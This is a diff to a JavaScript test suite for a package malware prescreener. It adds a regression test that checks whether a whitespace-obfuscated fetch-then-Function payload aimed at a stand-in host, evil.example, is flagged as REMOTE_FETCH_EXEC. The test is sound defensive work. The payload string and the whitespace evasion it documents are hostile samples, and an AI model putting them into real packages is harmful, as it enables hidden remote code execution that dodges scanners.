@@ -140,9 +140,22 @@ function runCrossFileRegressionCase() {
   console.log('  ✓ Cross-file Function + execSync split triggers DYNAMIC_CODE_EXEC_CHAIN_CROSS_FILE');
 }
 
+function runWhitespaceBypassRegressionCase() {
+  const tracker = new BehaviorTracker();
+  const pkg = 'pkg:prescreener-whitespace';
+  const payload = "fetch ('https://evil.example/x'); Function ('return 1')();";
+
+  const out = tracker.analyzeModule('ws.js', payload, pkg);
+
+  assert(out.some(v => v.rule === 'REMOTE_FETCH_EXEC'), 'Expected REMOTE_FETCH_EXEC for whitespace-tolerant fetch+Function payload');
+
+  console.log('  ✓ Whitespace-tolerant fetch + Function payload now triggers a violation');
+}
+
 function main() {
   runKeywordSupersetCanaryTests();
   runCrossFileRegressionCase();
+  runWhitespaceBypassRegressionCase();
   console.log('All prescreener superset tests passed.');
 }
 
